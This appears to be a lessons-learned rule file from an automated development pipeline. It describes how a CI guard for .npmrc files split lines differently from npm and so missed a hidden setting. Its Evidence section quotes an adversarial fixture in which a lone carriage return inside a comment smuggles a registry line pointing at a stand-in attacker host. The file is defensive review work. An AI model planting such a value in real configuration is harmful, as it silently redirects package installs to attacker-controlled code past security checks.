---
id: parser-guard-line-splitting
trigger: "when writing or reviewing a guard script that parses a config file the same way a real tool will later parse it (ini, env, yaml, or similar line-oriented formats)"
confidence: 0.5
domain: security
source: 2026-09-20-pin-node-22-12-minimum, wh-security-reviewer.md line 10 and conductor-log.md lines 38-39 (check-npmrc.mjs split lines on \n only after stripping \r, while npm's own ini parser splits on /[\r\n]+/; a lone CR inside a comment line hid a live registry= setting from the guard while npm still honored it)
---

## Action

A guard script that re-implements how another tool parses a file is only as safe as its
agreement with that tool's actual splitting and comment rules, and that agreement is not
obvious from reading the guard's own logic in isolation. When reviewing or writing such a
script (any `check-*.mjs`-style CI guard over an ini, env, or similar file), do two things
before treating it as covered: (1) read the real tool's parser source or run it directly against
adversarial line-ending fixtures (lone CR, lone LF, CRLF, mixed) and diff its behavior against
the guard's, rather than trusting that both split on "newlines"; (2) add adversarial eval cases
for exactly this class (control characters and mixed line endings hiding a value inside what
looks like a comment) to the eval design step for any new parser-style guard, since this is a
class of bug generic code review and even a security-focused review pass did not catch until the
shipper independently reproduced the fixture.

## Evidence

- `docs/sdlc/2026-09-20-pin-node-22-12-minimum/reviews/wh-security-reviewer.md:10` "high | ...
  fixture `# harmless comment<CR>registry=https://evil.example.com/` ... gave guard exit 0
  'passed' while `npm config list` ... printed `registry = \"https://evil.example.com/\"`."
- `docs/sdlc/2026-09-20-pin-node-22-12-minimum/conductor-log.md:38` "wh-shipper blocked: found a
  new high, check-npmrc splits on newline only so a lone CR hides a registry line; reproduced
  with npm config get registry" — found after review and a green verification pass, per the
  conductor's own account of that turn.
